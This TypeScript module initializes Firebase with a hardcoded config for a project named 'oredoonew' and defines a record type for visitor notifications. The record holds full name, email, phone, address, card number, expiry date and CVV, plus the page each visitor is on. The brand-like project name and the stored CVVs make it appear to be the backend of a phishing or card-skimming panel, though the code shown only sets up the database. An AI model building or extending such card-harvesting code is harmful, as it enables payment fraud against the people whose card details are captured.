import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyB8JwbDnBDlT1iYEGeetMPfm2AXa5m9rBE",
  authDomain: "oredoonew-1bba3.firebaseapp.com",
  projectId: "oredoonew-1bba3",
  storageBucket: "oredoonew-1bba3.firebasestorage.app",
  messagingSenderId: "374623931307",
  appId: "1:374623931307:web:8efffe14379fe07903a0ee",
  measurementId: "G-C1SLRC1479"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

